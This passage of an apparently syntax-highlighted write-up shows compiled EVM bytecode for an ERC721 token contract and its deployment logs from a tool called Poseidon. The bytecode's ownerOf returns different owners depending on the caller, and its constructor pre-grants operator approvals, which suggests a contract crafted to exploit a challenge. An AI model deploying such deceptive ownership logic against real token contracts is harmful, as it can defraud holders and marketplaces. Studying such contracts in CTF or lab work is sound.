548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506200022330600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016200035260201b60201c565b6200027b600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016200035260201b60201c565b505050620009a7565b600033905090565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603620003c3576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620003ba906200094b565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c3183604051620004b691906200098a565b60405180910390a3505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620004f582620004c8565b9050919050565b6200050781620004e8565b81146200051357600080fd5b50565b6000815190506200052781620004fc565b92915050565b600080600060608486031215620005495762000548620004c3565b5b6000620005598682870162000516565b93505060206200056c8682870162000516565b92505060406200057f8682870162000516565b9150509250925092565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806200060b57607f821691505b602082108103620006215762000620620005c3565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b6000600883026200068b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff826200064c565b6200069786836200064c565b95508019841693508086168417925050509392505050565b6000819050919050565b6000819050919050565b6000620006e4620006de620006d884620006af565b620006b9565b620006af565b9050919050565b6000819050919050565b6200070083620006c3565b620007186200070f82620006eb565b84845462000659565b825550505050565b600090565b6200072f62000720565b6200073c818484620006f5565b505050565b5b8181101562000764576200075860008262000725565b60018101905062000742565b5050565b601f821115620007b3576200077d8162000627565b62000788846200063c565b8101602085101562000798578190505b620007b0620007a7856200063c565b83018262000741565b50505b505050565b600082821c905092915050565b6000620007d860001984600802620007b8565b1980831691505092915050565b6000620007f38383620007c5565b9150826002028217905092915050565b6200080e8262000589565b67ffffffffffffffff8111156200082a576200082962000594565b5b620008368254620005f2565b6200084382828562000768565b600060209050601f8311600181146200087b576000841562000866578287015190505b620008728582620007e5565b865550620008e2565b601f1984166200088b8662000627565b60005b82811015620008b5578489015182556001820191506020850194506020810190506200088e565b86831015620008d55784890151620008d1601f891682620007c5565b8355505b6001600288020188555050505b505050505050565b600082825260208201905092915050565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b600062000933601983620008ea565b91506200094082620008fb565b602082019050919050565b60006020820190508181036000830152620009668162000924565b9050919050565b60008115159050919050565b62000984816200096d565b82525050565b6000602082019050620009a1600083018462000979565b92915050565b612aac80620009b76000396000f3fe608060405234801561001057600080fd5b506004361061010b5760003560e01c806370a08231116100a2578063a22cb46511610071578063a22cb465146102a4578063b88d4fde146102c0578063c87b56dd146102dc578063e985e9c51461030c578063f2fde38b1461033c5761010b565b806370a082311461022e578063715018a61461025e5780638da5cb5b1461026857806395d89b41146102865761010b565b806323b872dd116100de57806323b872dd146101aa57806340c10f19146101c657806342842e0e146101e25780636352211e146101fe5761010b565b806301ffc9a71461011057806306fdde0314610140578063081812fc1461015e578063095ea7b31461018e575b600080fd5b61012a60048036038101906101259190611c13565b610358565b6040516101379190611c5b565b60405180910390f35b61014861043a565b6040516101559190611d06565b60405180910390f35b61017860048036038101906101739190611d5e565b6104cc565b6040516101859190611dcc565b60405180910390f35b6101a860048036038101906101a39190611e13565b610512565b005b6101c460048036038101906101bf9190611e53565b610629565b005b6101e060048036038101906101db9190611e13565b610689565b005b6101fc60048036038101906101f79190611e53565b61069f565b005b61021860048036038101906102139190611d5e565b6106bf565b6040516102259190611dcc565b60405180910390f35b61024860048036038101906102439190611ea6565b6107ea565b6040516102559190611ee2565b60405180910390f35b6102666108a1565b005b6102706108b5565b60405161027d9190611dcc565b60405180910390f35b61028e6108df565b60405161029b9190611d06565b60405180910390f35b6102be60048036038101906102b99190611f29565b610971565b005b6102da60048036038101906102d5919061209e565b610987565b005b6102f660048036038101906102f19190611d5e565b6109e9565b6040516103039190611d06565b60405180910390f35b61032660048036038101906103219190612121565b610a51565b6040516103339190611c5b565b60405180910390f35b61035660048036038101906103519190611ea6565b610ae5565b005b60007f80ac58cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916148061042357507f5b5e139f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b80610433575061043282610b68565b5b9050919050565b60606000805461044990612190565b80601f016020809104026020016040519081016040528092919081815260200182805461047590612190565b80156104c25780601f10610497576101008083540402835291602001916104c2565b820191906000526020600020905b8154815290600101906020018083116104a557829003601f168201915b5050505050905090565b60006104d782610bd2565b6004600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b600061051d82610c1d565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff160361058d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161058490612233565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff166105ac610ca3565b73ffffffffffffffffffffffffffffffffffffffff1614806105db57506105da816105d5610ca3565b610a51565b5b61061a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610611906122c5565b60405180910390fd5b6106248383610cab565b505050565b61063a610634610ca3565b82610d64565b610679576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161067090612357565b60405180910390fd5b610684838383610df9565b505050565b6106916110f2565b61069b8282611170565b5050565b6106ba83838360405180602001604052806000815250610987565b505050565b6000600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff160361074057600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690506107e5565b600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16036107bf57600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690506107e5565b600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690505b919050565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160361085a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610851906123e9565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6108a96110f2565b6108b3600061138d565b565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6060600180546108ee90612190565b80601f016020809104026020016040519081016040528092919081815260200182805461091a90612190565b80156109675780601f1061093c57610100808354040283529160200191610967565b820191906000526020600020905b81548152906001019060200180831161094a57829003601f168201915b5050505050905090565b61098361097c610ca3565b8383611453565b5050565b610998610992610ca3565b83610d64565b6109d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109ce90612357565b60405180910390fd5b6109e3848484846115bf565b50505050565b60606109f482610bd2565b60006109fe61161b565b90506000815111610a1e5760405180602001604052806000815250610a49565b80610a2884611632565b604051602001610a39929190612445565b6040516020818303038152906040525b915050919050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b610aed6110f2565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610b5c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b53906124db565b60405180910390fd5b610b658161138d565b50565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b610bdb81611700565b610c1a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c1190612547565b60405180910390fd5b50565b600080610c2983611741565b9050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610c9a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c9190612547565b60405180910390fd5b80915050919050565b600033905090565b816004600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16610d1e83610c1d565b73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b600080610d7083610c1d565b90508073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480610db25750610db18185610a51565b5b80610df057508373ffffffffffffffffffffffffffffffffffffffff16610dd8846104cc565b73ffffffffffffffffffffffffffffffffffffffff16145b91505092915050565b8273ffffffffffffffffffffffffffffffffffffffff16610e1982610c1d565b73ffffffffffffffffffffffffffffffffffffffff1614610e6f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e66906125d9565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610ede576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ed59061266b565b60405180910390fd5b610eeb838383600161177e565b8273ffffffffffffffffffffffffffffffffffffffff16610f0b82610c1d565b73ffffffffffffffffffffffffffffffffffffffff1614610f61576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f58906125d9565b60405180910390fd5b6004600082815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055506001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a46110ed83838360016118a4565b505050565b6110fa610ca3565b73ffffffffffffffffffffffffffffffffffffffff166111186108b5565b73ffffffffffffffffffffffffffffffffffffffff161461116e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611165906126d7565b60405180910390fd5b565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036111df576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016111d690612743565b60405180910390fd5b6111e881611700565b15611228576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161121f906127af565b60405180910390fd5b61123660008383600161177e565b61123f81611700565b1561127f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611276906127af565b60405180910390fd5b6001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a46113896000838360016118a4565b5050565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036114c1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114b89061281b565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31836040516115b29190611c5b565b60405180910390a3505050565b6115ca848484610df9565b6115d6848484846118aa565b611615576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161160c906128ad565b60405180910390fd5b50505050565b606060405180602001604052806000815250905090565b60606000600161164184611a31565b01905060008167ffffffffffffffff8111156116605761165f611f73565b5b6040519080825280601f01601f1916602001820160405280156116925781602001600182028036833780820191505090505b509050600082602001820190505b6001156116f5578080600190039150507f3031323334353637383961626364656600000000000000000000000000000000600a86061a8153600a85816116e9576116e86128cd565b5b049450600085036116a0575b819350505050919050565b60008073ffffffffffffffffffffffffffffffffffffffff1661172283611741565b73ffffffffffffffffffffffffffffffffffffffff1614159050919050565b60006002600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b600181111561189e57600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16146118125780600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461180a919061292b565b925050819055505b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161461189d5780600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254611895919061295f565b925050819055505b5b50505050565b50505050565b60006118cb8473ffffffffffffffffffffffffffffffffffffffff16611b84565b15611a24578373ffffffffffffffffffffffffffffffffffffffff1663150b7a026118f4610ca3565b8786866040518563ffffffff1660e01b815260040161191694939291906129e8565b6020604051808303816000875af192505050801561195257506040513d601f19601f8201168201806040525081019061194f9190612a49565b60015b6119d4573d8060008114611982576040519150601f19603f3d011682016040523d82523d6000602084013e611987565b606091505b5060008151036119cc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119c3906128ad565b60405180910390fd5b805181602001fd5b63150b7a0260e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614915050611a29565b600190505b949350505050565b600080600090507a184f03e93ff9f4daa797ed6e38ed64bf6a1f0100000000000000008310611a8f577a184f03e93ff9f4daa797ed6e38ed64bf6a1f0100000000000000008381611a8557611a846128cd565b5b0492506040810190505b6d04ee2d6d415b85acef81000000008310611acc576d04ee2d6d415b85acef81000000008381611ac257611ac16128cd565b5b0492506020810190505b662386f26fc100008310611afb57662386f26fc100008381611af157611af06128cd565b5b0492506010810190505b6305f5e1008310611b24576305f5e1008381611b1a57611b196128cd565b5b0492506008810190505b6127108310611b49576127108381611b3f57611b3e6128cd565b5b0492506004810190505b60648310611b6c5760648381611b6257611b616128cd565b5b0492506002810190505b600a8310611b7b576001810190505b80915050919050565b6000808273ffffffffffffffffffffffffffffffffffffffff163b119050919050565b6000604051905090565b600080fd5b600080fd5b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b611bf081611bbb565b8114611bfb57600080fd5b50565b600081359050611c0d81611be7565b92915050565b600060208284031215611c2957611c28611bb1565b5b6000611c3784828501611bfe565b91505092915050565b60008115159050919050565b611c5581611c40565b82525050565b6000602082019050611c706000830184611c4c565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015611cb0578082015181840152602081019050611c95565b60008484015250505050565b6000601f19601f8301169050919050565b6000611cd882611c76565b611ce28185611c81565b9350611cf2818560208601611c92565b611cfb81611cbc565b840191505092915050565b60006020820190508181036000830152611d208184611ccd565b905092915050565b6000819050919050565b611d3b81611d28565b8114611d4657600080fd5b50565b600081359050611d5881611d32565b92915050565b600060208284031215611d7457611d73611bb1565b5b6000611d8284828501611d49565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000611db682611d8b565b9050919050565b611dc681611dab565b82525050565b6000602082019050611de16000830184611dbd565b92915050565b611df081611dab565b8114611dfb57600080fd5b50565b600081359050611e0d81611de7565b92915050565b60008060408385031215611e2a57611e29611bb1565b5b6000611e3885828601611dfe565b9250506020611e4985828601611d49565b9150509250929050565b600080600060608486031215611e6c57611e6b611bb1565b5b6000611e7a86828701611dfe565b9350506020611e8b86828701611dfe565b9250506040611e9c86828701611d49565b9150509250925092565b600060208284031215611ebc57611ebb611bb1565b5b6000611eca84828501611dfe565b91505092915050565b611edc81611d28565b82525050565b6000602082019050611ef76000830184611ed3565b92915050565b611f0681611c40565b8114611f1157600080fd5b50565b600081359050611f2381611efd565b92915050565b60008060408385031215611f4057611f3f611bb1565b5b6000611f4e85828601611dfe565b9250506020611f5f85828601611f14565b9150509250929050565b600080fd5b600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b611fab82611cbc565b810181811067ffffffffffffffff82111715611fca57611fc9611f73565b5b80604052505050565b6000611fdd611ba7565b9050611fe98282611fa2565b919050565b600067ffffffffffffffff82111561200957612008611f73565b5b61201282611cbc565b9050602081019050919050565b82818337600083830152505050565b600061204161203c84611fee565b611fd3565b90508281526020810184848401111561205d5761205c611f6e565b5b61206884828561201f565b509392505050565b600082601f83011261208557612084611f69565b5b813561209584826020860161202e565b91505092915050565b600080600080608085870312156120b8576120b7611bb1565b5b60006120c687828801611dfe565b94505060206120d787828801611dfe565b93505060406120e887828801611d49565b925050606085013567ffffffffffffffff81111561210957612108611bb6565b5b61211587828801612070565b91505092959194509250565b6000806040838503121561213857612137611bb1565b5b600061214685828601611dfe565b925050602061215785828601611dfe565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806121a857607f821691505b6020821081036121bb576121ba612161565b5b50919050565b7f4552433732313a20617070726f76616c20746f2063757272656e74206f776e6560008201527f7200000000000000000000000000000000000000000000000000000000000000602082015250565b600061221d602183611c81565b9150612228826121c1565b604082019050919050565b6000602082019050818103600083015261224c81612210565b9050919050565b7f4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f60008201527f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000602082015250565b60006122af603d83611c81565b91506122ba82612253565b604082019050919050565b600060208201905081810360008301526122de816122a2565b9050919050565b7f4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6560008201527f72206f7220617070726f76656400000000000000000000000000000000000000602082015250565b6000612341602d83611c81565b915061234c826122e5565b604082019050919050565b6000602082019050818103600083015261237081612334565b9050919050565b7f4552433732313a2061646472657373207a65726f206973206e6f74206120766160008201527f6c6964206f776e65720000000000000000000000000000000000000000000000602082015250565b60006123d3602983611c81565b91506123de82612377565b604082019050919050565b60006020820190508181036000830152612402816123c6565b9050919050565b600081905092915050565b600061241f82611c76565b6124298185612409565b9350612439818560208601611c92565b80840191505092915050565b60006124518285612414565b915061245d8284612414565b91508190509392505050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b60006124c5602683611c81565b91506124d082612469565b604082019050919050565b600060208201905081810360008301526124f4816124b8565b9050919050565b7f4552433732313a20696e76616c696420746f6b656e2049440000000000000000600082015250565b6000612531601883611c81565b915061253c826124fb565b602082019050919050565b6000602082019050818103600083015261256081612524565b9050919050565b7f4552433732313a207472616e736665722066726f6d20696e636f72726563742060008201527f6f776e6572000000000000000000000000000000000000000000000000000000602082015250565b60006125c3602583611c81565b91506125ce82612567565b604082019050919050565b600060208201905081810360008301526125f2816125b6565b9050919050565b7f4552433732313a207472616e7366657220746f20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000612655602483611c81565b9150612660826125f9565b604082019050919050565b6000602082019050818103600083015261268481612648565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b60006126c1602083611c81565b91506126cc8261268b565b602082019050919050565b600060208201905081810360008301526126f0816126b4565b9050919050565b7f4552433732313a206d696e7420746f20746865207a65726f2061646472657373600082015250565b600061272d602083611c81565b9150612738826126f7565b602082019050919050565b6000602082019050818103600083015261275c81612720565b9050919050565b7f4552433732313a20746f6b656e20616c7265616479206d696e74656400000000600082015250565b6000612799601c83611c81565b91506127a482612763565b602082019050919050565b600060208201905081810360008301526127c88161278c565b9050919050565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b6000612805601983611c81565b9150612810826127cf565b602082019050919050565b60006020820190508181036000830152612834816127f8565b9050919050565b7f4552433732313a207472616e7366657220746f206e6f6e20455243373231526560008201527f63656976657220696d706c656d656e7465720000000000000000000000000000602082015250565b6000612897603283611c81565b91506128a28261283b565b604082019050919050565b600060208201905081810360008301526128c68161288a565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061293682611d28565b915061294183611d28565b9250828203905081811115612959576129586128fc565b5b92915050565b600061296a82611d28565b915061297583611d28565b925082820190508082111561298d5761298c6128fc565b5b92915050565b600081519050919050565b600082825260208201905092915050565b60006129ba82612993565b6129c4818561299e565b93506129d4818560208601611c92565b6129dd81611cbc565b840191505092915050565b60006080820190506129fd6000830187611dbd565b612a0a6020830186611dbd565b612a176040830185611ed3565b8181036060830152612a2981846129af565b905095945050505050565b600081519050612a4381611be7565b92915050565b600060208284031215612a5f57612a5e611bb1565b5b6000612a6d84828501612a34565b9150509291505056fea2646970667358221220fdbeed55f866252f7841c4221ee6ecd1be8f2bb2241a6226cc4156eea10c55fa64736f6c63430008100033000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>25.328</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>__init__</span><span class=p>:</span><span class=mi>484</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>Instantiate</span><span class=p>]</span><span class=n>Successfully</span> <span class=n>instantiated</span> <span class=n>contract</span> <span class=p>[</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span><span class=p>]</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>25.332</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>DeployContract</span><span class=p>:</span><span class=mi>428</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>DeployContract</span><span class=p>][</span><span class=n>Success</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockNumber</span><span class=p>]</span><span class=mi>106737</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Value</span><span class=p>]</span><span class=mi>0</span> <span class=p>[</span><span class=n>GasUsed</span><span class=p>]</span><span class=mi>4260667</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Logs</span><span class=p>][</span><span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xfF25FACBE77eac4eD3603188CccB9431f1A26448&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;</span><span class=p>),</span> <span 